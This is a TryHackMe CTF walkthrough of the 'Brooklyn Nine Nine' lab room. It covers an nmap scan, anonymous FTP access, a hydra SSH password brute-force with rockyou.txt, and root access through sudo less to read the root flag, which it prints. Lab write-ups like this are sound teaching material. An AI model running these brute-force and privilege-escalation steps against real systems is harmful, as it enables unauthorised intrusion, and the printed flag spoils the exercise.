# Try-hack-me-CTF-walkthroughs-writeups

<h3>Brooklyn Nine Nine is an easy machine in TryHackMe in which we’ll use basic enumeration and use hydra.</h3>

<p>1. First of all, let’s use NMAP to see which ports are open:</p>

    $ nmap -A -T4 -p- -vv <TARGET IP>
    Starting Nmap 7.80 ( https://nmap.org ) at 2020–07–26 00:33 CEST
    Nmap scan report for 10.10.30.131
    Host is up (0.045s latency).
    Not shown: 65532 closed ports
    PORT STATE SERVICE VERSION
    21/tcp open ftp vsftpd 3.0.3
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rw-r — r — 1 0 0 119 May 17 23:17 note_to_jake.txt
    22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Site doesn’t have a title (text/html).
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

From the output, we understand that there are three open ports:

1. 21 FTP
2. 22 SSH
3. 80 HTTP<br>

On the HTTP service we have just an image and in the source code there is a comment that tells something about steganography, but for now we will go with FTP.


Then we can see that the FTP allows anonymous login and that there is a txt file named note_to_jake.txt.

Login to the FTP service and check what it holds (if you put a ‘-’ after the file, you can see the content on the terminal):

    ftp> get note_to_jake.txt -
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
    From Amy,Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine226 Transfer complete.
    119 bytes received in 0.00125 seconds (93.2 kbytes/s)
    Dammit what you do Jake, you are a mess but at least you are not a brown noser like someone else.. What do you think Amy?

Ok, close the FTP connection and let’s go to the next step.

Gently grab the Dept’s key
For this, we need hydra:

    $ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET IP> -f -VV -t 4

After a while, hydra will find the password. Thank you, Jake.


Now we have the password for the machine, we can now attempt to ssh onto the machine to get the user flag. we can do this by:

    $ ssh jake@<TARGET IP>
    jake@brookly_nine_nine:~$ ls -la
    total 44
    drwxr-xr-x 6 jake jake 4096 May 26 09:01 .
    drwxr-xr-x 5 root root 4096 May 18 10:21 ..
    -rw — — — — 1 root root 1349 May 26 09:01 .bash_history
    -rw-r — r — 1 jake jake 220 Apr 4 2018 .bash_logout
    -rw-r — r — 1 jake jake 3771 Apr 4 2018 .bashrc
    drwx — — — 2 jake jake 4096 May 17 21:36 .cache
    drwx — — — 3 jake jake 4096 May 17 21:36 .gnupg
    -rw — — — — 1 root root 67 May 26 09:01 .lesshst
    drwxrwxr-x 3 jake jake 4096 May 26 08:57 .local
    -rw-r — r — 1 jake jake 807 Apr 4 2018 .profile
    drwx — — — 2 jake jake 4096 May 18 14:29 .ssh
    -rw-r — r — 1 jake jake 0 May 17 21:36 .sudo_as_admin_successful

Inside the jake’s directory I don’t find anything useful, so let’s go to the upper level

    jake@brookly_nine_nine:~$ ls -la ../
    total 20
    drwxr-xr-x 5 root root 4096 May 18 10:21 .
    drwxr-xr-x 24 root root 4096 May 19 15:17 ..
    drwxr-xr-x 5 amy amy 4096 May 18 10:23 amy
    drwxr-xr-x 6 holt holt 4096 May 26 09:01 holt
    drwxr-xr-x 6 jake jake 4096 May 26 09:01 jake

Amy’s directory is empty, but the Captain’s dir is not:

    jake@brookly_nine_nine:~$ ls -la ../holt/
    total 48
    drwxr-xr-x 6 holt holt 4096 May 26 09:01 .
    drwxr-xr-x 5 root root 4096 May 18 10:21 ..
    -rw — — — — 1 holt holt 18 May 26 09:01 .bash_history
    -rw-r — r — 1 holt holt 220 May 17 21:42 .bash_logout
    -rw-r — r — 1 holt holt 3771 May 17 21:42 .bashrc
    drwx — — — 2 holt holt 4096 May 18 10:24 .cache
    drwx — — — 3 holt holt 4096 May 18 10:24 .gnupg
    drwxrwxr-x 3 holt holt 4096 May 17 21:46 .local
    -rw-r — r — 1 holt holt 807 May 17 21:42 .profile
    drwx — — — 2 holt holt 4096 May 18 14:45 .ssh
    -rw — — — — 1 root root 110 May 18 17:12 nano.save
    -rw-rw-r — 1 holt holt 33 May 17 21:49 user.txt

As we can see from the above, Holt holds the user.txt file. we can now “cd” into the holt folder and cat the user.txt file.

getting root flag.

This has 2 possible ways of getting the root flag. I am only going to show one way.

first we can run (‘sudo -l’). Running ‘sudo -l’ can tell us if the user we currently are can run any commands as sudo without having to enter any sort of password.

as you can see from the screenshot below, we can run the less commands as root without password.


So, Lets run less command

    jake@brookly_nine_nine:~$ sudo /usr/bin/less /root/root.txt
    -- Creator : Fsociety2006 --
    Congratulations in rooting Brooklyn Nine Nine
    Here is the flag: wubalubadubdub
    Enjoy!!
    
<h2>Conclusion</h2>
Thanks to Fsociety2006 for the room. It is very funny for a B99 “fan” like me and still useful for beginners.

Hope this could be appreciated by someone out there.

Stay safe.

